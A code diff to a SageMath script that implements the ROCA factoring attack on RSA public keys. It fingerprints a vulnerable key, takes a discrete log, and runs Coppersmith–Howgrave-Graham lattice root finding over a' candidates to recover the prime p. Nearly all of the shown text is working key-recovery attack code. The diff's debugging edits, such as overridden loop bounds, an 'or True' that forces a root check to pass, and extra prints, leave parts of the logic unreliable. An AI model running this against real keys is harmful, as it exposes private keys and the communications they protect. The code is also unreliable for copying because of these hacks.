@@ -49,34 +49,45 @@ def get_start(c, ord, id):
 def worker(args):
     # {'cpu': rest, 'n': n, 'M_strich': M_strich,'m': m, 't': t, 'c': c, 'ord_new': ord_new}
     id = args['cpu']
-    pub_key = args['n']
+    N = args['N']
     M_strich = args['M_strich']
     t = args['t']
     c = args['c']
     ord = args['ord_new']
     m = args['m']
-    n = pub_key.n
 
     beta = 0.5
-    X = 2 * pow(n, beta) / M
+    X = 2 * pow(N, beta) / M_strich
+
     start = get_start(c, ord, id)
     end = get_end(c, ord, id)
-    ZmodN = Zmod(n)
+    ZmodN = Zmod(N)
+
+    print(end - start)
+
+    print((c + ord)/2 - c/2)
+    start = c/2
+    end = (c + ord)/2
+    #tmp = []
 
     for a_strich in xrange(start, end):
         R.<x> = PolynomialRing(ZmodN)
 
-        invers = inverse_mod(int(M_strich), n)
-        pol = x + invers * int(Integer(65537).powermod(a_strich, M_strich))
+        invers = inverse_mod(int(M_strich), N)
+        pol = x + (invers * int(Integer(65537).powermod(a_strich, M_strich)))
 
-        roots = coppersmith_howgrave_univariate(pol, n, beta, m, t, X)
+        #print("Pol: %s, N: %d, beta: %f, m: %d, t: %d, X: %f" % (str(pol), N, beta, m, t, X))
+        roots = coppersmith_howgrave_univariate(pol, N, beta, m, t, X)
+        print(roots)
+        #tmp.append(roots)
+
         for root in roots:
             p = root * M_strich + int(Integer(65537).powermod(a_strich, M_strich))
-            if Mod(n, p) == 0:
+            if N % p == 0:
                 print("--- %s seconds ---" % (time.time() - start_time))
                 print("Success p: %d " % p)
                 break  # Todo: break gilt nur für die innere Schleife - Beenden aller threads
-
+    #print(tmp)
     return
 
 
@@ -91,8 +102,8 @@ def coppersmith_howgrave_univariate(pol, modulus, beta, mm, tt, XX):
     #
     # init
     #
-    # dd = pol.degree()
-    dd = 1
+    dd = pol.degree()
+    #dd = 1
     nn = dd * mm + tt
 
     #
@@ -188,17 +199,17 @@ def coppersmith_howgrave_univariate(pol, modulus, beta, mm, tt, XX):
 
     # factor polynomial
     potential_roots = new_pol.roots()
-    # print "potential roots:", potential_roots
+    #print("potential roots:", potential_roots)
 
     # test roots
     roots = []
     for root in potential_roots:
-        if root[0].is_integer():
+        if root[0].is_integer() or True:
             result = polZ(ZZ(root[0]))
+            print("GCD: %d, Modulus hoch Beta: %d" % (gcd(modulus, result), modulus^beta))
             if gcd(modulus, result) >= modulus ^ beta:
                 roots.append(ZZ(root[0]))
 
-    #
     return roots
 
 
@@ -271,13 +282,16 @@ def get_param(key_size):
     if key_size < 510:
         return 0
     elif key_size < 961:
-        return {'anz': 39, 'm': 4, 't': 5}
+        return {'anz': 39, 'm': 5, 't': 6}
     elif key_size < 992:
         return 0
     elif key_size < 1953:
-        return {'anz': 71, 'm': 6, 't': 7}
+        return {'anz': 71, 'm': 4, 't': 5}
     elif key_size < 1984:
         return 0
+    elif key_size < 2049:
+        return {'anz': 126, 'm': 6, 't': 7}
+
     elif key_size < 3937:
         return {'anz': 126, 'm': 25, 't': 26}
     elif key_size < 3968:
@@ -304,7 +318,7 @@ def prime_factors(n):
 def a2(M, pfo, ord_strich):
     # M_strich = ZZ(M)
     M_strich = M
-    print(pfo)
+
     for p in reversed(pfo):
         # ord_pi teilt nicht ord_strich
         # print("Ord_strich in A2: %d" % ord_strich)
@@ -419,7 +433,7 @@ if __name__ == "__main__":
 
         n = get_primes(param['anz'])
         M = calcM(n)
-
+        #print("test: %d" % 7.42527440660050e39)
         # Checks if PubKey is Vulnerable to ROCA
         if fingerprint(M, pub_key.n) == 1:
             limes = math.log(pub_key.n, 2) / 4
@@ -431,8 +445,9 @@ if __name__ == "__main__":
             threads = []
             b = Mod(65537, M_strich)
             c = discrete_log(pub_key.n, b)
-            p = Pool()
-            p.map(worker, parm(pub_key, M_strich, param['m'], param['t'], c, ord_new))
+            worker({'cpu': 0, 'N': pub_key.n, 'M_strich': M_strich, 'm': param['m'], 't': param['t'], 'c': c, 'ord_new': ord_new})
+            #p = Pool()
+            #p.map(worker, parm(pub_key, M_strich, param['m'], param['t'], c, ord_new))
         else:
             print("Resistant Key: Terminating execution!")
 
